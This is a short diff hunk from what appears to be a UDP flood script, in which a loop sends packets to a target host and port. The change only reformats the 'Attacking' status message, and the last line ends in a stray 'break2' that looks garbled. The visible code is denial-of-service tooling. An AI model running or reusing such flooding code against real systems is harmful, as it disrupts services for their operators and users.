@@ -100,7 +100,7 @@ def udp():
     while True:
         try:
             s.sendto(packet, (target, port))
-            print("[#][Attacking] %s %s" %(target, port))
+            print("[#] Attacking %s %s" %(target, port))
         except:
             print("[!] No Connection, server may be down")
             break2
